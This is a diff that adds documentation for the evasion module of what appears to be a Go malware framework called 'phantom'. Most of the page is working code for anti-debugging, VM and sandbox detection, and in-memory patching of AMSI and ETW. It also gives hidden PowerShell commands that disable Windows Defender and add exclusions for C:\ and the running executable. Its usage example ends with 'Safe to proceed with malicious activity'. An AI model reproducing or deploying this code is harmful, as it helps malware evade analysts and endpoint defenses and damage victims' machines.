@@ -1,0 +1,590 @@
+---
+title: "Anti-Analysis & Evasion"
+description: "Documentation for the evasion module - anti-debugging, anti-VM, sandbox detection, and defense bypasses"
+---
+
+## Overview
+
+The `evasion` module implements anti-analysis techniques to detect and evade debuggers, virtual machines, sandboxes, and security software. It combines multiple detection methods for reliability.
+
+<Warning>
+These techniques are commonly flagged by antivirus software. Use sparingly and only when necessary.
+</Warning>
+
+## Main Entry Point
+
+### RunAntiAnalysis()
+
+Main function that performs all evasion checks.
+
+```go evasion/evasion.go:51-80
+func RunAntiAnalysis(antiVM, antiDebug bool) bool {
+    if antiDebug {
+        // first, try to hide ourselves from any attached debugger
+        hideFromDebugger()
+
+        // then check if we're being debugged anyway
+        if isDebugged() {
+            return false // nope, get outta here
+        }
+    }
+
+    if antiVM {
+        // check for VM indicators
+        if isVirtualized() {
+            return false
+        }
+
+        // sandboxes often mess with timing
+        if isSandboxTiming() {
+            return false
+        }
+
+        // real machines have real resources
+        if isResourceConstrained() {
+            return false
+        }
+    }
+
+    return true // all good, let's go
+}
+```
+
+<ParamField path="antiVM" type="bool">
+  Enable virtual machine and sandbox detection
+</ParamField>
+
+<ParamField path="antiDebug" type="bool">
+  Enable debugger detection and anti-debugging techniques
+</ParamField>
+
+**Returns:** `true` if safe to proceed, `false` if analysis environment detected
+
+## Anti-Debugging Techniques
+
+### hideFromDebugger()
+
+Uses `NtSetInformationThread` to hide thread from debugger events.
+
+```go evasion/evasion.go:84-93
+func hideFromDebugger() {
+    handle, _, _ := procGetCurrentThread.Call()
+    // ThreadHideFromDebugger = 0x11 (17)
+    procNtSetInformationThread.Call(
+        handle,
+        ThreadHideFromDebugger,
+        0,
+        0,
+    )
+}
+```
+
+<Note>
+This doesn't detach debuggers, but prevents them from receiving debug events.
+</Note>
+
+### isDebugged()
+
+Combines multiple debugger detection methods:
+
+```go evasion/evasion.go:97-151
+func isDebugged() bool {
+    // Method 1: good old IsDebuggerPresent
+    if syscalls.IsDebuggerPresent() {
+        return true
+    }
+
+    // Method 2: CheckRemoteDebuggerPresent
+    if syscalls.CheckRemoteDebugger() {
+        return true
+    }
+
+    // Method 3: NtQueryInformationProcess - DebugPort
+    var debugPort uintptr
+    handle, _ := syscall.GetCurrentProcess()
+    ret, _, _ := procNtQueryInformationProcess.Call(
+        uintptr(handle),
+        ProcessDebugPort,
+        uintptr(unsafe.Pointer(&debugPort)),
+        unsafe.Sizeof(debugPort),
+        0,
+    )
+    if ret == 0 && debugPort != 0 {
+        return true // nonzero port = debugger attached
+    }
+
+    // Method 4: NtQueryInformationProcess - DebugFlags
+    var debugFlags uint32
+    ret, _, _ = procNtQueryInformationProcess.Call(
+        uintptr(handle),
+        ProcessDebugFlags,
+        uintptr(unsafe.Pointer(&debugFlags)),
+        unsafe.Sizeof(debugFlags),
+        0,
+    )
+    if ret == 0 && debugFlags == 0 {
+        return true // flags=0 means NoDebugInherit is set
+    }
+
+    // Method 5: timing check
+    start := time.Now()
+    for i := 0; i < 100; i++ {
+        _ = i * i
+    }
+    elapsed := time.Since(start)
+    if elapsed > time.Millisecond*100 {
+        return true // way too slow, probably single-stepping
+    }
+
+    return false
+}
+```
+
+<Accordion title="Debugger Detection Methods">
+**1. IsDebuggerPresent**
+- Checks PEB.BeingDebugged flag
+- Easy to bypass but catches basic debuggers
+
+**2. CheckRemoteDebuggerPresent**
+- Detects remote debugging scenarios
+- Checks kernel object flags
+
+**3. NtQueryInformationProcess - ProcessDebugPort (7)**
+- Queries kernel for debug port
+- Returns non-zero if debugger attached
+- Harder to fake than PEB flag
+
+**4. NtQueryInformationProcess - ProcessDebugFlags (31)**
+- Checks NoDebugInherit flag
+- Returns 0 if being debugged
+
+**5. Timing Check**
+- Simple operations should be fast
+- Slow execution indicates single-stepping
+</Accordion>
+
+## Virtual Machine Detection
+
+### isVirtualized()
+
+Detects VM and sandbox environments through multiple indicators:
+
+```go evasion/evasion.go:155-253
+func isVirtualized() bool {
+    // Check running processes for VM tools
+    processes, _ := syscalls.EnumProcesses()
+
+    // VM-specific processes
+    vmProcesses := []string{
+        // vmware
+        "vmtoolsd.exe", "vmwaretray.exe", "vmwareuser.exe",
+        // virtualbox
+        "vboxservice.exe", "vboxtray.exe",
+        // qemu/kvm
+        "qemu-ga.exe", "vdagent.exe", "vdservice.exe",
+        // xen
+        "xenservice.exe",
+        // joe sandbox
+        "joeboxcontrol.exe", "joeboxserver.exe",
+        // parallels
+        "prl_tools.exe", "prl_cc.exe",
+        // sandboxie
+        "sandboxierpcss.exe", "sandboxiedcomlaunch.exe",
+    }
+
+    for _, proc := range processes {
+        procLower := strings.ToLower(proc)
+        for _, vmProc := range vmProcesses {
+            if procLower == vmProc {
+                return true
+            }
+        }
+    }
+
+    // Analysis tool processes
+    analysisProcs := []string{
+        // network
+        "wireshark.exe", "fiddler.exe", "charles.exe",
+        // process analysis
+        "procmon.exe", "procexp.exe", "processhacker.exe",
+        // debuggers
+        "x64dbg.exe", "x32dbg.exe", "ollydbg.exe",
+        // disassemblers
+        "idaq.exe", "idaq64.exe", "ida.exe", "ida64.exe",
+        // other
+        "pestudio.exe", "pe-bear.exe",
+        "ghidra.exe", "binaryninja.exe",
+    }
+
+    for _, proc := range processes {
+        procLower := strings.ToLower(proc)
+        for _, analysisProc := range analysisProcs {
+            if procLower == analysisProc {
+                return true
+            }
+        }
+    }
+
+    // Registry checks for VM artifacts
+    vmRegistryKeys := []string{
+        `HKEY_LOCAL_MACHINE\SOFTWARE\VMware, Inc.\VMware Tools`,
+        `HKEY_LOCAL_MACHINE\SOFTWARE\Oracle\VirtualBox Guest Additions`,
+        `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Virtual Machine\Guest\Parameters`,
+    }
+
+    for _, key := range vmRegistryKeys {
+        cmd := exec.Command("reg", "query", key)
+        cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+        if err := cmd.Run(); err == nil {
+            return true // key exists = VM
+        }
+    }
+
+    // MAC address prefix check
+    vmMACPrefixes := []string{
+        "00:0C:29", "00:50:56", "00:05:69", // VMware
+        "08:00:27", "0A:00:27", // VirtualBox
+        "00:1C:42", // Parallels
+        "00:16:3E", // Xen
+        "00:15:5D", // Hyper-V
+    }
+
+    cmd := exec.Command("getmac", "/fo", "csv", "/nh")
+    cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+    output, err := cmd.Output()
+    if err == nil {
+        outputStr := strings.ToUpper(string(output))
+        for _, prefix := range vmMACPrefixes {
+            if strings.Contains(outputStr, strings.ReplaceAll(prefix, ":", "-")) {
+                return true
+            }
+        }
+    }
+
+    return false
+}
+```
+
+<Accordion title="VM Detection Indicators">
+**Process-based:**
+- VMware Tools (vmtoolsd.exe, vmwaretray.exe)
+- VirtualBox Guest Additions (vboxservice.exe, vboxtray.exe)
+- QEMU Guest Agent (qemu-ga.exe)
+- Parallels Tools (prl_tools.exe)
+- Sandbox software (Sandboxie, Joe Sandbox)
+
+**Registry-based:**
+- VMware registry keys
+- VirtualBox registry keys
+- Hyper-V registry keys
+
+**Hardware-based:**
+- MAC address OUI (Organizationally Unique Identifier)
+- Each VM vendor has specific MAC prefixes
+</Accordion>
+
+## Sandbox Detection
+
+### isSandboxTiming()
+
+Detects sandboxes through timing manipulation:
+
+```go evasion/evasion.go:257-270
+func isSandboxTiming() bool {
+    // Sleep for 500ms and check if it actually took that long
+    start := syscalls.GetTickCount64()
+    time.Sleep(500 * time.Millisecond)
+    elapsed := syscalls.GetTickCount64() - start
+
+    // Should be around 500ms
+    // If it's much less, sandbox is probably skipping our sleep
+    if elapsed < 450 {
+        return true
+    }
+
+    return false
+}
+```
+
+<Note>
+Many sandboxes accelerate time or skip sleep calls to speed up analysis.
+</Note>
+
+### isResourceConstrained()
+
+Detects minimal VM/sandbox environments:
+
+```go evasion/evasion.go:274-301
+func isResourceConstrained() bool {
+    // RAM check - sandboxes usually have 1-2GB
+    mem, err := syscalls.GetMemoryStatus()
+    if err == nil {
+        totalGB := mem.TotalPhys / (1024 * 1024 * 1024)
+        if totalGB < 4 {
+            return true // who uses a PC with <4GB RAM in 2024?
+        }
+    }
+
+    // CPU check - sandboxes often have 1-2 cores
+    if runtime.NumCPU() < 2 {
+        return true
+    }
+
+    // disk size check
+    if isDiskSmall() {
+        return true
+    }
+
+    // check for user activity
+    if !hasRecentFiles() {
+        return true
+    }
+
+    return false
+}
+```
+
+### isDiskSmall()
+
+Sandboxes typically have small disks (20-40GB):
+
+```go evasion/evasion.go:304-317
+func isDiskSmall() bool {
+    var freeBytesAvailable, totalBytes, totalFreeBytes uint64
+
+    pathPtr, _ := syscall.UTF16PtrFromString("C:\\")
+    kernel32.NewProc("GetDiskFreeSpaceExW").Call(
+        uintptr(unsafe.Pointer(pathPtr)),
+        uintptr(unsafe.Pointer(&freeBytesAvailable)),
+        uintptr(unsafe.Pointer(&totalBytes)),
+        uintptr(unsafe.Pointer(&totalFreeBytes)),
+    )
+
+    totalGB := totalBytes / (1024 * 1024 * 1024)
+    return totalGB < 60 // less than 60GB is sus
+}
+```
+
+### hasRecentFiles()
+
+Real users have activity; fresh sandboxes don't:
+
+```go evasion/evasion.go:321-330
+func hasRecentFiles() bool {
+    recentPath := os.Getenv("APPDATA") + `\Microsoft\Windows\Recent`
+    entries, err := os.ReadDir(recentPath)
+    if err != nil {
+        return true // can't check, assume real to avoid false positives
+    }
+
+    // real users have lots of recent files
+    return len(entries) > 10
+}
+```
+
+## Defense Bypass Techniques
+
+### PatchAMSI()
+
+Disables Windows AMSI (Anti-Malware Scan Interface):
+
+```go evasion/evasion.go:335-376
+func PatchAMSI() error {
+    // try to load amsi.dll
+    amsi := syscall.NewLazyDLL("amsi.dll")
+    amsiScanBuffer := amsi.NewProc("AmsiScanBuffer")
+
+    addr := amsiScanBuffer.Addr()
+    if addr == 0 {
+        return nil // amsi not loaded, we're good
+    }
+
+    // Patch bytes: xor eax, eax; ret
+    // This makes the function return 0 (AMSI_RESULT_CLEAN)
+    patch := []byte{0x31, 0xC0, 0xC3}
+
+    // need to make memory writable first
+    var oldProtect uint32
+    ret, _, _ := procVirtualProtect.Call(
+        addr,
+        uintptr(len(patch)),
+        PAGE_EXECUTE_READWRITE,
+        uintptr(unsafe.Pointer(&oldProtect)),
+    )
+    if ret == 0 {
+        return nil
+    }
+
+    // write our patch
+    for i, b := range patch {
+        *(*byte)(unsafe.Pointer(addr + uintptr(i))) = b
+    }
+
+    // restore original protection
+    procVirtualProtect.Call(
+        addr,
+        uintptr(len(patch)),
+        uintptr(oldProtect),
+        uintptr(unsafe.Pointer(&oldProtect)),
+    )
+
+    return nil
+}
+```
+
+<Accordion title="AMSI Bypass Explained">
+**What is AMSI?**
+- Anti-Malware Scan Interface (Windows 10+)
+- Allows AV to scan script content
+- Used by PowerShell, .NET, VBA, etc.
+
+**Bypass Method:**
+- Patch `AmsiScanBuffer` function
+- Replace function body with `xor eax, eax; ret`
+- Function now always returns AMSI_RESULT_CLEAN (0)
+
+**Assembly:**
+```asm
+31 C0    ; xor eax, eax  (set return value to 0)
+C3       ; ret           (return)
+```
+</Accordion>
+
+### PatchETW()
+
+Disables Event Tracing for Windows (used by EDRs):
+
+```go evasion/evasion.go:380-415
+func PatchETW() error {
+    ntdll := syscall.NewLazyDLL("ntdll.dll")
+    etwEventWrite := ntdll.NewProc("EtwEventWrite")
+
+    addr := etwEventWrite.Addr()
+    if addr == 0 {
+        return nil
+    }
+
+    // just make it return immediately
+    patch := []byte{0xC3} // ret
+
+    var oldProtect uint32
+    ret, _, _ := procVirtualProtect.Call(
+        addr,
+        uintptr(len(patch)),
+        PAGE_EXECUTE_READWRITE,
+        uintptr(unsafe.Pointer(&oldProtect)),
+    )
+    if ret == 0 {
+        return nil
+    }
+
+    // single byte patch
+    *(*byte)(unsafe.Pointer(addr)) = patch[0]
+
+    // restore protection
+    procVirtualProtect.Call(
+        addr,
+        uintptr(len(patch)),
+        uintptr(oldProtect),
+        uintptr(unsafe.Pointer(&oldProtect)),
+    )
+
+    return nil
+}
+```
+
+<Note>
+ETW is used by EDRs (Endpoint Detection and Response) to monitor process behavior. Patching it can reduce detection.
+</Note>
+
+### DisableWindowsDefender()
+
+Attempts to disable Windows Defender (requires admin):
+
+```go evasion/evasion.go:420-434
+func DisableWindowsDefender() {
+    // these need admin rights
+    cmds := []string{
+        `Set-MpPreference -DisableRealtimeMonitoring $true`,
+        `Set-MpPreference -DisableBehaviorMonitoring $true`,
+        `Set-MpPreference -DisableBlockAtFirstSeen $true`,
+        `Set-MpPreference -DisableIOAVProtection $true`,
+        `Set-MpPreference -DisableScriptScanning $true`,
+        `Add-MpPreference -ExclusionPath "C:\"`,
+    }
+
+    for _, cmd := range cmds {
+        exec.Command("powershell", "-WindowStyle", "Hidden", "-Command", cmd).Run()
+    }
+}
+```
+
+<Warning>
+Requires administrator privileges. Usually fails on standard user accounts.
+</Warning>
+
+### AddDefenderExclusion()
+
+Adds exe to Defender exclusions (sometimes works without admin):
+
+```go evasion/evasion.go:438-449
+func AddDefenderExclusion() {
+    exePath, err := os.Executable()
+    if err != nil {
+        return
+    }
+
+    cmd := exec.Command("powershell", "-WindowStyle", "Hidden", "-Command",
+        `Add-MpPreference -ExclusionPath "`+exePath+`"`)
+    cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+    cmd.Run()
+}
+```
+
+## Detection Indicators Summary
+
+<Tabs>
+  <Tab title="Debugger">
+    - PEB.BeingDebugged flag set
+    - Debug port exists (NtQueryInformationProcess)
+    - NoDebugInherit flag clear
+    - Slow execution (single-stepping)
+    - Remote debugger present
+  </Tab>
+  <Tab title="Virtual Machine">
+    - VM tools processes running
+    - VM registry keys present
+    - VM-specific MAC address
+    - Low resources (RAM, CPU, disk)
+    - No user activity
+  </Tab>
+  <Tab title="Sandbox">
+    - Time acceleration/skipping
+    - Minimal resources
+    - Fresh install (no recent files)
+    - Analysis tools running
+    - Suspicious process names
+  </Tab>
+</Tabs>
+
+## Usage Example
+
+```go
+import "phantom/evasion"
+
+func main() {
+    // Run anti-analysis checks
+    if !evasion.RunAntiAnalysis(true, true) {
+        // Detected! Exit safely
+        os.Exit(0)
+    }
+
+    // Bypass defenses
+    evasion.PatchAMSI()
+    evasion.PatchETW()
+    evasion.AddDefenderExclusion()
+
+    // Safe to proceed with malicious activity
+    // ...
+}
+```
